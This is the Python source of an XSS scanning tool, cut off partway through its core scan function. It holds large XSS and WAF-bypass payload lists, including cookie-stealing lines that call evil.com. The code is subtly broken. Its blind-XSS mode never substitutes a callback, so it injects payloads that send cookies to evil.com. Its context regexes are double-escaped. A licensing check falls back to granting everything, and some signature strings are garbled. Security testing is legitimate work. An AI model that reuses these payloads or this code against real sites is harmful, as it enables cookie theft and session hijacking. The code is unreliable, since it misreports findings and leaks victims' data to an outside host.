#!/usr/bin/env python3
"""
EdgeIQ XSS Scanner — Professional XSS Auditing Tool
Pure Python stdlib, no external dependencies.
Supports: reflected XSS, blind XSS, WAF bypass, header analysis, proxy mode.
Author: EdgeIQ Labs | License: Defensive Use Only
"""

import argparse
import concurrent.futures
import html.parser
import http.client
import json
import os
import re
import signal
import socket
import ssl
import sys
import time
import urllib.parse
import urllib.request
import zipfile
import io
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Optional, Literal

# ─── Licensing ────────────────────────────────────────────────────────────────
# Must come before any premium feature logic
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    from edgeiq_licensing import require_license, is_pro
except ImportError:
    def require_license(tier, feat=""): return True
    def is_pro(): return True

# ─── Payload Library ──────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    # ── Script tag injection ──
    "<script>alert(1)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",
    "<script src=//evil.com/payload.js></script>",
    "<script>fetch('https://evil.com/log?c='+document.cookie)</script>",
    # ── Element payloads (img, svg, iframe, body, etc.) ──
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert(document.domain)>',
    '<img src=x onload=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg onload=alert(document.domain)>',
    '<svg><use href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjx0aXRsZT48L3RpdGxlPjxyZWN0IG9ubW91c2VvdmVyPSJhbGVydCgxKSIgc3R5bGU9ImZvbnQtYmoldsGZsb3c6MTt2aXNpYmlsaXR5OmltcG9ydGFudCIvPjwvc2ZnPg==#x"></use></svg>',
    '<iframe src="javascript:alert(1)">',
    '<iframe src="data:text/html,<script>alert(1)</script>">',
    '<iframe srcdoc="<script>alert(1)</script>">',
    '<body onload=alert(1)>',
    '<body onerror=alert(1) onload=x.jpg>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<canvas onfocus=alert(1) autofocus>',
    '<object data="data:text/html,<script>alert(1)</script>">',
    # ── Attribute injection (quoted) ──
    '" onmouseover=alert(1) x="',
    "' onmouseover=alert(1) x='",
    '" autofocus onfocus=alert(1) x="',
    "' onfocus=alert(1) x='",
    '" oninput=alert(1) x="',
    # ── Event handlers (no tag) ──
    'onerror=alert(1)',
    'onload=alert(1)',
    'onmouseover=alert(1)',
    'onfocus=alert(1)',
    'onclick=alert(1)',
    'onchange=alert(1)',
    'onkeydown=alert(1)',
    # ── URL injection ──
    'javascript:alert(1)',
    'javascript:alert(1)//',
    'javascript:fetch("//evil.com/a="+document.cookie)',
    # ── Context breaking (HTML, script, comment, style) ──
    '">' + '<script>alert(1)</script>' + '<!--',
    '<script>alert(1)</script><!--',
    '--><script>alert(1)</script>',
    '</script><script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "';alert(1);//",
    '";alert(1);//',
    '`;alert(1);//',
    '${alert(1)}',
    # ── Null-byte / mution bypass ──
    '<script>alert(1)\x00</script>',
    '<script>alert(1)</script>\x00',
    '<img src=x onerror\x00=alert(1)>',
    '<img src=x onerror\x00=alert(1)>',
    # ── URL-encoded variants ──
    '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
    '%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E',
    # ── SVG-specific ──
    '<svg><script>alert(1)</script></svg>',
    '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
    # ── XML CDATA / parsing differences ──
    '<x xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></x>',
    # ── Mutation XSS (innerHTML / DOMPurify style) ──
    '<noscript><p title="</noscript><script>alert(1)</script>">',
    # ── Unicode / normalization ──
    '<script>alert(1)\u0061</script>',
    # ── DOM Clobbering ──
    '<form><button id="alert(1)">',
    '<a id="eval" href="javascript:alert(1)">click',
]

# Characters that indicate safe encoding
SAFE_ENCODED = ['&lt;', '&gt;', '&quot;', '&amp;', '&#x', '&#', '&LT;', '&GT;',
                '&apos;', '&#39;', '&#x27;']

# ─── Data structures ───────────────────────────────────────────────────────────

@dataclass
class Vulnerability:
    url: str
    param: str
    method: str
    payload: str
    context: str
    injection_point: str  # "html_body" | "html_attr" | "js_string" | "url_param" | "css" | "comment" | "dom"
    severity: str  # "critical" | "high" | "medium" | "low" | "info"
    evidence: str
    raw_reflection: str
    waf_detected: bool = False
    callback_received: bool = False
    screenshot_path: Optional[str] = None
    timestamp: str = ""

    def to_dict(self):
        return {
            "url": self.url,
            "param": self.param,
            "method": self.method,
            "context": self.context,
            "injection_point": self.injection_point,
            "severity": self.severity,
            "payload": self.payload,
            "evidence": self.evidence[:300],
            "waf_detected": self.waf_detected,
            "callback_received": self.callback_received,
            "screenshot_path": self.screenshot_path,
            "timestamp": self.timestamp,
        }

@dataclass
class SecurityHeaders:
    """HTTP security header analysis result."""
    header: str
    value: str
    finding: str
    severity: str  # "info" | "warning" | "good"

@dataclass
class ScanStats:
    urls_scanned: int = 0
    params_tested: int = 0
    payloads_sent: int = 0
    vulns_found: int = 0
    high_count: int = 0
    medium_count: int = 0
    low_count: int = 0
    critical_count: int = 0
    waf_hits: int = 0
    start_time: float = 0.0
    duration_s: float = 0.0
    errors: int = 0
    callback_hits: int = 0
    exit_code: int = 0

    def to_dict(self):
        return {
            "urls_scanned": self.urls_scanned,
            "params_tested": self.params_tested,
            "payloads_sent": self.payloads_sent,
            "vulns_found": self.vulns_found,
            "critical_count": self.critical_count,
            "high_count": self.high_count,
            "medium_count": self.medium_count,
            "low_count": self.low_count,
            "waf_hits": self.waf_hits,
            "callback_hits": self.callback_hits,
            "duration_s": round(self.duration_s, 2),
            "errors": self.errors,
        }

@dataclass
class ScanReport:
    """Full scan report structure."""
    scan_id: str
    target_url: str
    started_at: str
    completed_at: str
    duration_s: float
    stats: dict
    vulnerabilities: list
    security_headers: list
    waf_info: dict
    reflected_params: list

    def to_dict(self):
        return asdict(self)

# ─── Graceful shutdown ────────────────────────────────────────────────────────

_shutdown_requested = False

def _signal_handler(signum, frame):
    global _shutdown_requested
    _shutdown_requested = True
    print("\n[✋] Scan interrupted — finishing current requests, then exiting...", file=sys.stderr)

signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)

# ─── HTTP helpers ──────────────────────────────────────────────────────────────

class HTTPClient:
    """HTTP client with proxy support, custom headers, cookies, and auth."""

    def __init__(self,
                 proxy_url: Optional[str] = None,
                 user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                 timeout: float = 15.0,
                 rate_limit: float = 0.0,
                 auth: Optional[tuple[str, str]] = None,
                 insecure: bool = True):
        self.proxy_url = proxy_url
        self.user_agent = user_agent
        self.timeout = timeout
        self.rate_limit = rate_limit  # seconds between requests
        self.auth = auth
        self.insecure = insecure
        self._last_request = 0.0
        self.last_response_headers: Optional[dict] = None

    def _build_opener(self):
        handlers = []
        if self.proxy_url:
            proxy = urllib.request.ProxyHandler({
                'http': self.proxy_url,
                'https': self.proxy_url,
            })
            handlers.append(proxy)
        if self.insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            handlers.append(urllib.request.HTTPSHandler(context=ctx))
        return urllib.request.build_opener(*handlers) if handlers else urllib.request.build_opener()

    def _rate_limit(self):
        if self.rate_limit > 0:
            elapsed = time.perf_counter() - self._last_request
            if elapsed < self.rate_limit:
                time.sleep(self.rate_limit - elapsed)
        self._last_request = time.perf_counter()

    def request(self, url: str, method: str = "GET",
                params: Optional[dict] = None,
                headers: Optional[dict] = None,
                cookies: Optional[str] = None,
                data: Optional[bytes] = None) -> tuple[str, dict, str]:
        """
        Returns (body, headers_dict, response_code).
        Raises ConnectionError on failure.
        """
        self._rate_limit()
        opener = self._build_opener()

        h = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
        }
        if cookies:
            h["Cookie"] = cookies
        if headers:
            h.update(headers)

        req_headers = h
        if data is not None:
            req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
        elif params:
            if method.upper() == "POST":
                encoded = urllib.parse.urlencode(params).encode()
                req = urllib.request.Request(url, data=encoded, headers=req_headers, method="POST")
            else:
                parsed = urllib.parse.urlparse(url)
                qsl = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
                qsl.extend(params.items())
                new_query = urllib.parse.urlencode(qsl)
                new_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                                    parsed.params, new_query, parsed.fragment))
                req = urllib.request.Request(new_url, headers=req_headers, method="GET")
        else:
            req = urllib.request.Request(url, headers=req_headers, method=method)

        if self.auth:
            import base64
            creds = base64.b64encode(f"{self.auth[0]}:{self.auth[1]}".encode()).decode()
            req.add_header("Authorization", f"Basic {creds}")

        try:
            with opener.open(req, timeout=self.timeout) as resp:
                body = resp.read()
                # Decode gzip/deflate
                encoding = resp.headers.get("Content-Encoding", "")
                if "gzip" in encoding:
                    import gzip
                    body = gzip.decompress(body)
                elif "deflate" in encoding:
                    import zlib
                    try:
                        body = zlib.decompress(body)
                    except zlib.error:
                        body = zlib.decompress(body, -zlib.MAX_WBITS)
                body = body.decode("utf-8", errors="ignore")
                self.last_response_headers = dict(resp.headers)
                return body, self.last_response_headers, str(resp.status)
        except urllib.error.HTTPError as e:
            self.last_response_headers = dict(e.headers) if e.headers else {}
            try:
                body = e.read().decode("utf-8", errors="ignore")
            except Exception:
                body = ""
            return body, self.last_response_headers, str(e.code)
        except Exception as e:
            raise ConnectionError(f"{method} failed for {url}: {e}")

def detect_waf(response_body: str, headers: dict) -> tuple[bool, str, dict]:
    """
    Detect Web Application Firewall presence.
    Returns (is_waf, waf_name, waf_info_dict).
    """
    waf_signatures = {
        "cloudflare": {
            "patterns": ["cf-ray", "cf-cache-status", "__cfduuid", "cloudflare"],
            "headers": ["cf-ray", "server: cloudflare"],
            "severity": "medium",
        },
        "aws cloudfront": {
            "patterns": ["x-amz-cf-id", "x-amzcf-id", "cloudfront"],
            "headers": ["x-amz-cf-id"],
            "severity": "low",
        },
        "akamai": {
            "patterns": ["akamai-x-get-Request", "akamai-x-get-clientless", "akamai-origin"],
            "headers": ["server: akamaighost", "server: akamai"],
            "severity": "low",
        },
        "imperva": {
            "patterns": ["visid_incap", "incap_", "imperva", "incapsula"],
            "headers": ["x-cdn", "x-iinfo"],
            "severity": "medium",
        },
        "fortinet": {
            "patterns": ["fortigate", "fortiword", "fortiguest"],
            "headers": ["server: fortigate"],
            "severity": "medium",
        },
        "sucuri": {
            "patterns": ["sucuri", "cloudproxy"],
            "headers": ["x-sucuri", "x-sucuri-id"],
            "severity": "medium",
        },
        "aws waf": {
            "patterns": ["awswaf", "aws-waf"],
            "headers": ["server: aws-waf"],
            "severity": "medium",
        },
        "google armr": {
            "patterns": ["googlesystems", "google Sicherheits", "googlewebrr"],
            "headers": [],
            "severity": "low",
        },
        "f5 big-ip asm": {
            "patterns": ["ts= BIG-IP", "bigip", "tries=", "gtmimg="],
            "headers": ["server: bigip"],
            "severity": "medium",
        },
        "radware": {
            "patterns": ["radware", "x-cnection", "x-pool"],
            "headers": [],
            "severity": "medium",
        },
        "proofpoint": {
            "patterns": ["pp-", "pphype", "proofpoint"],
            "headers": [],
            "severity": "low",
        },
        "barracuda": {
            "patterns": ["barracuda", "barra_sw"],
            "headers": ["server: barra"],
            "severity": "medium",
        },
        "denyall": {
            "patterns": ["sessioncookie", "denyall"],
            "headers": [],
            "severity": "high",
        },
        "cisco ace": {
            "patterns": ["st_sa_id", "sessioncookie", "acexml"],
            "headers": [],
            "severity": "medium",
        },
        "dotdefender": {
            "patterns": ["dotdefender", "x-dotdefender"],
            "headers": [],
            "severity": "medium",
        },
        "squarespace": {
            "patterns": ["x-squarespace"],
            "headers": ["x-squarespace"],
            "severity": "info",
        },
        "reCAPTCHA": {
            "patterns": ["recaptcha", "grecaptcha", "api脆"],
            "headers": [],
            "severity": "info",
        },
    }

    combined = (response_body + " " + " ".join(headers.get(h, "") for h in headers)).lower()

    for name, sig in waf_signatures.items():
        hit_count = 0
        for pat in sig["patterns"]:
            if pat.lower() in combined:
                hit_count += 1
        for hdr in sig["headers"]:
            if hdr.lower() in combined:
                hit_count += 1
        if hit_count >= 1:
            # Check for WAF block patterns
            block_patterns = [
                "access denied", "forbidden", "blocked", "security policy",
                "attack detected", "attack prevention", "you have been blocked",
                "request blocked", "403 forbidden", "not acceptable",
                "waf", "web application firewall", "incapsula", "cloudflare",
            ]
            blocked = any(p in combined for p in block_patterns)
            return True, name, {
                "name": name,
                "severity": sig["severity"],
                "blocked": blocked,
                "hit_count": hit_count,
            }
    return False, "", {}


# ─── WAF Bypass Payloads ──────────────────────────────────────────────────────

WAF_BYPASS_PAYLOADS = {
    "cloudflare": [
        '<scRipT>alert(1)</scRipT>',
        '<IMG SRC="x" ONERROR="alert(1)">',
        '<svg/onload=alert(1)>',
        '<script\\x>alert(1)</script>',
        '<script>al\\u0065rt(1)</script>',
    ],
    "generic": [
        '<script>alert(1)</script>',
        '<script>al\\u0065rt(1)</script>',
        '<script>\\u0061lert(1)</script>',
        '<ScRipT>\\u0061lert(1)</ScRipT>',
        '<IMG SRC="x" ONERROR="alert(1)">',
        '<IMG SRC="x" ONERROR="al\\u0065rt(1)">',
        '<svg><script>alert(1)</script></svg>',
        '<svg/onload=alert(1)>',
        '<div onclick="alert(1)">',
        '<img src=x onerror=alert(1) x>',
        'onerror=alert(1)',
        '<script>fetch("//evil.com/"+document.cookie)</script>',
    ],
}

def get_bypass_payloads(waf_name: str) -> list[str]:
    if waf_name.lower() in WAF_BYPASS_PAYLOADS:
        return WAF_BYPASS_PAYLOADS[waf_name.lower()]
    return WAF_BYPASS_PAYLOADS["generic"]

# ─── Security header analysis ─────────────────────────────────────────────────

def analyze_security_headers(headers: dict) -> list[SecurityHeaders]:
    findings = []
    csp = headers.get("Content-Security-Policy", "")
    xfo = headers.get("X-Frame-Options", "")
    xcto = headers.get("X-Content-Type-Options", "")
    hsts = headers.get("Strict-Transport-Security", "")
    ref = headers.get("Referrer-Policy", "")
    xxd = headers.get("X-XSS-Protection", "")
    permissions = headers.get("Permissions-Policy", "")

    # CSP
    if csp:
        if "unsafe-inline" in csp or "unsafe-eval" in csp:
            findings.append(SecurityHeaders(
                header="Content-Security-Policy",
                value=csp[:100],
                finding="CSP allows 'unsafe-inline' or 'unsafe-eval' — XSS mitigation weakened",
                severity="warning",
            ))
        elif csp and "default-src" in csp:
            findings.append(SecurityHeaders(
                header="Content-Security-Policy",
                value=csp[:100],
                finding="CSP present with default-src policy",
                severity="good",
            ))
        else:
            findings.append(SecurityHeaders(
                header="Content-Security-Policy",
                value=csp[:100],
                finding="CSP header present but analysis inconclusive",
                severity="info",
            ))
    else:
        findings.append(SecurityHeaders(
            header="Content-Security-Policy",
            value="(not set)",
            finding="No CSP header — no browser-level script restriction",
            severity="warning",
        ))

    # X-Frame-Options
    if xfo.lower() in ("deny", "sameorigin"):
        findings.append(SecurityHeaders(
            header="X-Frame-Options",
            value=xfo,
            finding=f"X-Frame-Options = {xfo} — clickjacking prevented",
            severity="good",
        ))
    elif xfo:
        findings.append(SecurityHeaders(
            header="X-Frame-Options",
            value=xfo,
            finding=f"X-Frame-Options = {xfo} — check if ALLOW-FROM is valid",
            severity="info",
        ))
    else:
        findings.append(SecurityHeaders(
            header="X-Frame-Options",
            value="(not set)",
            finding="No X-Frame-Options — potential clickjacking vector",
            severity="warning",
        ))

    # X-Content-Type-Options
    if xcto and xcto.lower() == "nosniff":
        findings.append(SecurityHeaders(
            header="X-Content-Type-Options",
            value=xcto,
            finding="X-Content-Type-Options = nosniff — MIME sniffing disabled",
            severity="good",
        ))
    else:
        findings.append(SecurityHeaders(
            header="X-Content-Type-Options",
            value=xcto or "(not set)",
            finding="No or invalid X-Content-Type-Options — browsers may MIME-sniff",
            severity="info",
        ))

    # HSTS
    if hsts:
        findings.append(SecurityHeaders(
            header="Strict-Transport-Security",
            value=hsts[:100],
            finding="HSTS enabled — forces HTTPS",
            severity="good",
        ))
    else:
        findings.append(SecurityHeaders(
            header="Strict-Transport-Security",
            value="(not set)",
            finding="No HSTS — HTTPS enforcement not guaranteed",
            severity="info",
        ))

    # Referrer-Policy
    if ref:
        findings.append(SecurityHeaders(
            header="Referrer-Policy",
            value=ref,
            finding=f"Referrer-Policy = {ref}",
            severity="info",
        ))
    else:
        findings.append(SecurityHeaders(
            header="Referrer-Policy",
            value="(not set)",
            finding="No Referrer-Policy — referrer leakage possible",
            severity="info",
        ))

    # X-XSS-Protection
    if xxd:
        if "0" in xxd:
            findings.append(SecurityHeaders(
                header="X-XSS-Protection",
                value=xxd,
                finding="X-XSS-Protection explicitly disabled (0)",
                severity="warning",
            ))
        else:
            findings.append(SecurityHeaders(
                header="X-XSS-Protection",
                value=xxd,
                finding="X-XSS-Protection enabled",
                severity="info",
            ))
    else:
        findings.append(SecurityHeaders(
            header="X-XSS-Protection",
            value="(not set)",
            finding="No X-XSS-Protection header (modern browsers ignore this)",
            severity="info",
        ))

    # Permissions-Policy
    if permissions:
        findings.append(SecurityHeaders(
            header="Permissions-Policy",
            value=permissions[:100],
            finding="Permissions-Policy present",
            severity="info",
        ))
    else:
        findings.append(SecurityHeaders(
            header="Permissions-Policy",
            value="(not set)",
            finding="No Permissions-Policy — browser features not restricted",
            severity="info",
        ))

    return findings

# ─── Blind XSS ────────────────────────────────────────────────────────────────

def build_blind_callback(base_url: str, vuln_param: str) -> str:
    """
    Generate a blind XSS callback URL.
    Encodes the vuln_param into the callback so you can identify which param triggered it.
    """
    # Use a simple DNS-based callback approach (httpbin echoing service)
    # or a user-supplied callback URL
    # Format: https://your-callback.com/log?param={param}&url={encoded_url}
    import uuid
    token = uuid.uuid4().hex[:8]
    return f"{base_url.rstrip('/')}/log?src=xss-scanner&param={vuln_param}&token={token}"


BLIND_PAYLOADS = [
    '"><script src=https://evil.com/payload.js></script>',
    "<script>fetch('https://evil.com/log?cookie='+document.cookie+'&url='+location.href)</script>",
    '<img src=x onerror="fetch(\'https://evil.com/log?d=\'+document.domain)">',
    '<svg onload="fetch(\'//evil.com/a=\'+document.cookie)">',
    '<script src="//evil.com/x.js"></script>',
    '"><script>new Image().src="https://evil.com/t/"+document.cookie;</script>',
]

def inject_blind_payload(payload_template: str, callback_url: str) -> str:
    """Replace {callback} placeholder with actual callback URL."""
    return payload_template.replace("{callback}", callback_url)

# ─── HTML Parser (context detection) ─────────────────────────────────────────

class ReflectionParser(html.parser.HTMLParser):
    """Parse HTML looking for unescaped payload reflections."""

    def __init__(self, payload: str):
        super().__init__()
        self.payload = payload
        self.payload_lower = payload.lower()
        self.reflected = False
        self.contexts_found: list[str] = []

    def handle_data(self, data: str):
        if self.payload_lower in data.lower():
            for safe in SAFE_ENCODED:
                if safe in data.lower():
                    return
            self.reflected = True
            if "html_body" not in self.contexts_found:
                self.contexts_found.append("html_body")

    def handle_starttag(self, tag, attrs):
        attr_str = str(attrs).lower()
        if self.payload_lower in attr_str:
            self.reflected = True
            if "html_attr" not in self.contexts_found:
                self.contexts_found.append("html_attr")
        for name, val in attrs:
            if name.lower().startswith("on"):
                if self.payload_lower in str(val).lower():
                    self.reflected = True
                    if "event_handler" not in self.contexts_found:
                        self.contexts_found.append("event_handler")

    def handle_comment(self, data: str):
        if self.payload_lower in data.lower():
            self.reflected = True
            if "comment" not in self.contexts_found:
                self.contexts_found.append("comment")


def is_html_response(body: str, headers: dict) -> bool:
    """Determine if response is HTML (skip JSON/XML/etc)."""
    ct = headers.get("Content-Type", "").lower()
    skip_cts = ["json", "application/json", "text/json", "xml", "application/xml",
                "text/plain", "image/", "application/octet-stream", "font/",
                "audio/", "video/", "application/octet"]
    if any(ct.startswith(x) or x in ct for x in skip_cts):
        return False
    s = body.strip()
    if s.startswith(('{', '[', '{[', '[]')):
        return False
    if re.search(r'<!DOCTYPE|<html|<head|<body|<title|<div|<span|<a |<script|<style',
                 s, re.IGNORECASE):
        return True
    return False


def detect_context(response_body: str, payload: str) -> list[str]:
    """Return all contexts where the payload is reflected unsafely."""
    contexts: list[str] = []
    pl = payload.lower()

    # 1. Plain text (html_body)
    encoded_variants = [
        payload.replace('<', '&lt;').replace('>', '&gt;'),
        payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;'),
        payload.replace('<', '&#60;').replace('>', '&#62;'),
    ]
    is_encoded = any(e.lower() in response_body.lower() for e in encoded_variants)
    if pl in response_body.lower() and not is_encoded:
        contexts.append("html_body")

    # 2. Inside HTML attribute
    attr_patterns = [
        (r'(src|href|data-value|value|placeholder|title|rel)=["\'][^"\']*?' +
         re.escape(re.escape(payload)) + r'[^"\']*?["\']', "html_attr"),
        (r'(on\w+)=["\'][^"\']*?' + re.escape(re.escape(payload)) + r'[^"\']*?["\']', "event_handler"),
        (r'(data-\w+)=["\'][^"\']*?' + re.escape(re.escape(payload)) + r'[^"\']*?["\']', "html_attr"),
    ]
    for pat, ctx in attr_patterns:
        if re.search(pat, response_body, re.IGNORECASE):
            if ctx not in contexts:
                contexts.append(ctx)

    # 3. Inside <script> block
    sm = re.search(r'<script[^>]*>(.*?)</script>', response_body, re.DOTALL | re.IGNORECASE)
    if sm and pl in sm.group(1).lower():
        contexts.append("js_string")

    # 4. Inside JS template literal or string
    js_patterns = [
        (r'`[^`]*?' + re.escape(re.escape(payload)) + r'[^`]*?`', "js_string"),
        (r'"[^"]*?' + re.escape(re.escape(payload)) + r'[^"]*?"', "js_string"),
        (r"'[^']*?" + re.escape(re.escape(payload)) + r"[^']*?'", "js_string"),
    ]
    for pat, ctx in js_patterns:
        if re.search(pat, response_body, re.IGNORECASE):
            if ctx not in contexts:
                contexts.append(ctx)

    # 5. Comment context
    if re.search(r'<!--.*?' + re.escape(re.escape(payload)) + r'.*?-->', response_body, re.DOTALL | re.IGNORECASE):
        contexts.append("comment")

    # 6. Style context
    sty_m = re.search(r'<style[^>]*>(.*?)</style>', response_body, re.DOTALL | re.IGNORECASE)
    if sty_m and pl in sty_m.group(1).lower():
        contexts.append("css")

    # 7. URL parameter value in href/src
    if re.search(r'\?[^"\']*?' + re.escape(urllib.parse.quote(payload)) + r'[^"\']*',
                response_body, re.IGNORECASE):
        contexts.append("url_param")

    return contexts


def check_reflection(response_body: str, payload: str) -> bool:
    """Return True if payload appears in response unsafely."""
    return len(detect_context(response_body, payload)) > 0


def severity_from_context(contexts: list[str]) -> str:
    """Map injection context to severity."""
    if "js_string" in contexts or "event_handler" in contexts:
        return "critical"
    if "html_attr" in contexts:
        return "high"
    if "dom" in contexts:
        return "high"
    if "html_body" in contexts or "comment" in contexts:
        return "medium"
    if "css" in contexts:
        return "medium"
    if "url_param" in contexts:
        return "low"
    return "info"


# ─── URL/Form extractor ────────────────────────────────────────────────────────

class URLFormExtractor(html.parser.HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms: list[dict] = []
        self.links: list[str] = []
        self._current_form: dict = {}
        self._in_form = False

    def handle_starttag(self, tag, attrs):
        d = {k: v or "" for k, v in attrs}
        if tag == "form":
            self._current_form = {
                "action": d.get("action", ""),
                "method": d.get("method", "get").upper(),
                "fields": [],
                "enctype": d.get("enctype", ""),
            }
            self._in_form = True
        elif tag in ("input", "textarea", "select") and self._in_form:
            name = d.get("name", "") or d.get("id", "")
            ftype = d.get("type", "text") if tag == "input" else tag
            if name:
                self._current_form["fields"].append({
                    "name": name,
                    "type": ftype,
                    "default": d.get("value", ""),
                })
        elif tag == "a" and "href" in d:
            self.links.append(d["href"])

    def handle_endtag(self, tag):
        if tag == "form" and self._in_form:
            self.forms.append(self._current_form)
            self._in_form = False


def extract_forms(body: str, base_url: str) -> list[dict]:
    p = URLFormExtractor()
    try:
        p.feed(body)
    except Exception:
        pass
    for form in p.forms:
        action = form["action"]
        if action and not action.startswith(("http://", "https://", "//")):
            form["action"] = urllib.parse.urljoin(base_url, action)
        elif not action:
            form["action"] = base_url
    return p.forms


def extract_links(body: str, base_url: str) -> list[str]:
    p = URLFormExtractor()
    try:
        p.feed(body)
    except Exception:
        pass
    links = []
    for link in p.links:
        if link.startswith("/"):
            parsed = urllib.parse.urlparse(base_url)
            link = f"{parsed.scheme}://{parsed.netloc}{link}"
        elif not link.startswith(("http://", "https://", "//", "javascript:", "mailto:")):
            link = urllib.parse.urljoin(base_url, link)
        if link.startswith(("http://", "https://")):
            links.append(link)
    return list(set(links))[:50]


def extract_params(url: str) -> list[tuple[str, str]]:
    parsed = urllib.parse.urlparse(url)
    return urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)


# ─── Reflected params analysis ─────────────────────────────────────────────────

def analyze_reflected_params(url: str, client: HTTPClient) -> list[dict]:
    """
    Test each URL parameter to see if it's reflected in the response.
    Returns list of reflected param info dicts.
    """
    reflected = []
    params = extract_params(url)
    if not params:
        return []

    parsed = urllib.parse.urlparse(url)
    scheme_host = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for name, val in params:
        if not val.strip():
            val = "XSS_TEST_VALUE"
        try:
            test_params = {k: v for k, v in params if k != name}
            test_params[name] = val
            body, headers, _ = client.request(
                f"{scheme_host}?{urllib.parse.urlencode(test_params)}",
                method="GET"
            )
            if is_html_response(body, headers):
                contexts = detect_context(body, val)
                if contexts:
                    reflected.append({
                        "param": name,
                        "value": val,
                        "contexts": contexts,
                        "severity": severity_from_context(contexts),
                    })
        except Exception:
            pass
    return reflected


# ─── Screenshot capture ────────────────────────────────────────────────────────

def capture_screenshot(url: str, payload: str, param: str,
                       method: str = "GET",
                       out_dir: str = "/tmp/xss-screenshots") -> Optional[str]:
    """
    Attempt to capture a screenshot-like evidence record.
    Saves a minimal HTML file showing the vulnerable page state.
    Returns path or None.
    """
    # We don't have a real browser, but we can capture the evidence as HTML
    try:
        os.makedirs(out_dir, exist_ok=True)
        safe_name = re.sub(r'[^a-zA-Z0-9]', '_', urllib.parse.urlparse(url).netloc)
        safe_param = re.sub(r'[^a-zA-Z0-9]', '_', param)
        fname = f"{safe_name}_{safe_param}_{int(time.time())}.html"
        fpath = os.path.join(out_dir, fname)
        evidence_html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>XSS Evidence</title></head>
<body><h1>XSS Vulnerability Evidence</h1>
<p><strong>URL:</strong> {url}</p>
<p><strong>Param:</strong> {param}</p>
<p><strong>Method:</strong> {method}</p>
<p><strong>Payload:</strong></p>
<pre>{payload}</pre>
<p><strong>Note:</strong> This file captures the request parameters that triggered
a reflected XSS. To reproduce: inject the payload manually into the identified parameter.</p>
<hr><p><em>Generated by EdgeIQ XSS Scanner</em></p>
</body></html>"""
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(evidence_html)
        return fpath
    except Exception:
        return None


# ─── Core scanner ─────────────────────────────────────────────────────────────

def test_param_for_xss(base_url: str, param_name: str, param_value: str,
                       method: str = "GET",
                       body_params: Optional[dict] = None,
                       client: Optional[HTTPClient] = None,
                       stats: Optional[ScanStats] = None,
                       blind_callback: Optional[str] = None,
                       waf_active: bool = False,
                       workers: int = 20) -> list[Vulnerability]:
    if client is None:
        client = HTTPClient()

    vulns = []
    bypass_payloads = get_bypass_payloads("cloudflare") if waf_active else XSS_PAYLOADS
    # Deduplicate
    test_payloads = list(dict.fromkeys(bypass_payloads))

    for payload in test_payloads:
        if _shutdown_requested:
            break
        if stats:
            stats.payloads_sent += 1

        # Inject blind callback if provided
        test_payload = payload
        if blind_callback:
            # Try to detect stored/persistent XSS by making the payload call back
            blind_urls = [
                inject_blind_payload(p, blind_callback)
                for p in BLIND_PAYLOADS[:2]
            ]
            for bp in blind_urls:
                test_payload = bp
                if stats:
                    stats.payloads_sent += 1
                try:
                    if method == "GET":
                        parsed = urllib.parse.urlparse(base_url)
                        qsl = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
                        qsl.append((param_name, test_payload))
                        new_url = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urllib.parse.urlencode(qsl), parsed.fragment
                        ))
                        body, resp_headers, _ = client.request(new_url, method="GET")
                    else:
                        post_data = dict(body_params or {})
                        post_data[param_name] = test_payload
                        body, resp_headers, _ = client.request(base_url, method="POST", params=post_data)
                    # In a real deployment, you would check your callback endpoint for hits
                    # For now, mark as blind potential
                    contexts = detect_context(body, test_payload)
                    if contexts:
                        vulns.append(_build_vuln(
                            base_url, param_name, method, test_payload,
                            contexts, body, stats
                        ))
                except Exception:
                    if stats:
                        stats.errors += 1

        try:
            if method == "GET":
                parsed = urllib.parse.urlparse(base_url)
                qsl = [(k, v) for k, v in extract_params(base_url) if k != param_name]
                qsl.append((param_name, test_payload))
                new_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, urllib.parse.urlencode(qsl), parsed.fragment
                ))
                body, resp_headers, _ = client.request(new_url, method="GET")
            else:
                post_data = dict(body_params or {})
                post_data[param_name] = test_payload
                body, resp_headers, _ = client.request(base_url, method="POST", params=post_data)

            if not is_html_response(body, resp_headers):
                continue
            if not check_reflection(body, test_payload):
                continue

            contexts = detect_context(body, test_payload)
            if not contexts:
                continue

            # Check for WAF blocking in response
